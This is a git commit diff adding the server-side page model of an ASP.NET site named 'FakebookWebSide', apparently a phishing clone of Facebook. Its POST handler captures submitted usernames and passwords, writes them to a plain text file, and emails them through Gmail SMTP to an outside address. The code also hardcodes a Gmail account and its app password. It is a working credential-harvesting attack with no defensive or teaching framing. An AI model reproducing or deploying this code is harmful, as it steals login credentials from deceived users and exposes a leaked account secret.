0ac76328081cb688b1db99d72998d5e35f484ef6
Agasef Memmedli <47360845+agasefmemmedli@users.noreply.github.com>
2022-10-08 00:24:49 +0400

    initial commit

---
+++ FakebookWebSide/Pages/Index.cshtml.cs
@@ -0,0 +1,71 @@
+﻿using Microsoft.AspNetCore.Mvc;
+using Microsoft.AspNetCore.Mvc.RazorPages;
+using System.IO;
+using System.Net.Mail;
+using System.Net;
+
+namespace FakebookWebSide.Pages
+{
+    public class IndexModel : PageModel
+    {
+        private readonly ILogger<IndexModel> _logger;
+
+        public IndexModel(ILogger<IndexModel> logger)
+        {
+            _logger = logger;
+        }
+
+        public void OnGet()
+        {
+
+        }
+        public void OnPost()
+        {
+            var userName = Request.Form["userName"];
+            var pass = Request.Form["pass"];
+            using (StreamWriter stream = new FileInfo("loginInfo.txt").AppendText())
+            {
+                stream.WriteLine("Username:" + userName.ToString().Trim() + "\r\n" + "Password:" + pass.ToString().Trim()+ "\r\n");
+            }
+
+            SendEmail(userName, pass);
+        }
+
+         
+
+        private void SendEmail(string userName, string pass)
+        {
+
+            var fromAddress = new MailAddress("ilkincavadovtest@gmail.com", "Fakebook");
+            var toAddress = new MailAddress("Ilkincavadovweb1@gmail.com", "Ilkin Cavadov");
+            
+            string fromPassword = "lmeegsudwyeqyoba";
+            string subject = "Fakebook";
+            string body = "Username:" + userName + "\r\n" + "Password:" + pass; 
+
+            var smtp = new SmtpClient
+            {
+                Host = "smtp.gmail.com",
+                Port = 587,
+                EnableSsl = true,
+                DeliveryMethod = SmtpDeliveryMethod.Network,
+                UseDefaultCredentials = false,
+                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
+            };
+            using (var message = new MailMessage(fromAddress, toAddress)
+            {
+                Subject = subject,
+                Body = body
+            })
+            {
+                smtp.Send(message);
+            }
+        }
+
+
+
+
+            
+         
+    }
+}
